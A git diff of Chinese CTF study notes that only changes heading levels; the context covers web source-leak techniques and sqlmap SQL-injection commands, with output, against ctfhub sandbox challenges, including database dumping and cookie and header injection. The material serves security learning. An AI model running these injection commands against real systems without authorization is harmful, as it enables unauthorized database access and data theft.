@@ -1,4 +1,4 @@
-# 1. 网页目录
+## 1. 网页目录
 
 - `dirb`
 
@@ -8,7 +8,7 @@
 
   > - https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/.DS_Store
 
-# 2. 编辑器（缓存）
+## 2. 编辑器（缓存）
 
 `vim`: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当 vim 异常退出时，缓存会一直留在服务器上，引起网站源码泄露
 
@@ -16,7 +16,7 @@
 
 e.g. vim 编辑 index.php，未保存退出，会导致原目录下出现 `.index.php.swp` 文件
 
-# 3. 信息备份
+## 3. 信息备份
 
 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露
 
@@ -69,7 +69,7 @@ for file_name in file_names:
             print(f"Found: {url}")
 ```
 
-# 4. git
+## 4. git
 
 > https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/Git泄露
 
@@ -125,11 +125,11 @@ Changes not staged for commit:
 	modified:   243712490420488.txt
 ```
 
-# 5. 默认口令
+## 5. 默认口令
 
 https://www.cnblogs.com/bflw/p/12938013.html
 
-# 6. 注入（sqlmap）
+## 6. 注入（sqlmap）
 
 > https://blog.csdn.net/m0_60651303/article/details/131704947
 >
@@ -235,7 +235,7 @@ Options:
     --wizard            Simple wizard interface for beginner users
 ```
 
-## GET
+### GET
 
 bp
 
@@ -257,7 +257,7 @@ url + 参数
 python sqlmap.py "http://challenge-58289ab9eb886e7d.sandbox.ctfhub.com:10800/?id=1"
 ```
 
-## POST
+### POST
 
 bp
 
@@ -285,7 +285,7 @@ username=admin&password=123124
 python sqlmap.py -r c:\1.txt -p username
 ```
 
-## （1）数据库 `--dbs`
+### （1）数据库 `--dbs`
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" --dbs
@@ -350,7 +350,7 @@ available databases [4]:
 [15:44:10] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
 ```
 
-## （2）表 `--tables`
+### （2）表 `--tables`
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
@@ -389,7 +389,7 @@ Database: sqli
 [15:49:42] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
 ```
 
-## （3）列 `--columns`
+### （3）列 `--columns`
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns
@@ -428,7 +428,7 @@ Table: flag
 [15:52:41] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
 ```
 
-## （4）内容 `--dump`
+### （4）内容 `--dump`
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag -C flag --dump
@@ -468,7 +468,7 @@ Table: flag
 [15:55:58] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
 ```
 
-## 其它选项
+### 其它选项
 
 ```shell
 do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
@@ -488,9 +488,9 @@ do you want sqlmap to try to optimize value(s) for DBMS delay responses (option 
 
 😆 **盲注**是一个字母一个字母的挤出来的
 
-## 进阶（`--level`, `--risk`, `--time-sec=2`）
+### 进阶（`--level`, `--risk`, `--time-sec=2`）
 
-### cookie
+#### cookie
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-6a38ed4519e03045.sandbox.ctfhub.com:10800" --cookie "id=1; hint=id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F" --level 2 --dbs
@@ -517,13 +517,13 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] n
 ```
 
-### UA/Refer 注入
+#### UA/Refer 注入
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-2fb3dbe4a07f0636.sandbox.ctfhub.com:10800" --level 3 --dbs
 ```
 
-### 过滤空格
+#### 过滤空格
 
 ```shell
 (venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-96c2d3e8613433d1.sandbox.ctfhub.com:10800/?id=1" --dbs
